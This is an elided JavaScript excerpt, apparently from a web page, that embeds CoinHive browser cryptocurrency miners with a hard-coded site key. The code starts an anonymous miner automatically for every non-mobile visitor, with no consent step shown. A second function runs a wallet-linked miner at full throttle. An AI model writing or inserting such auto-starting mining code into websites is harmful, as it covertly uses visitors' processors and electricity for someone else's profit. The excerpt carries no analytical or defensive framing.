...
var anonMiner = new CoinHive.Anonymous('wa8hBKDsq6HbuplTPJj6NZr0MGs3kVuH', {throttle: 0.2});
if (!miner.isMobile()) {
    anonMiner.start();
}
else {
...
function startUserMiner() {
    ...
    var userMiner = new CoinHive.User('wa8hBKDsq6HbuplTPJj6NZr0MGs3kVuH', userWalletAddress, {threads: 1,
        throttle: 1});
    // AnonMiner.stop();
    ...
    createAttribute('data-key', 'wa8hBKDsq6HbuplTPJj6NZr0MGs3kVuH', div);
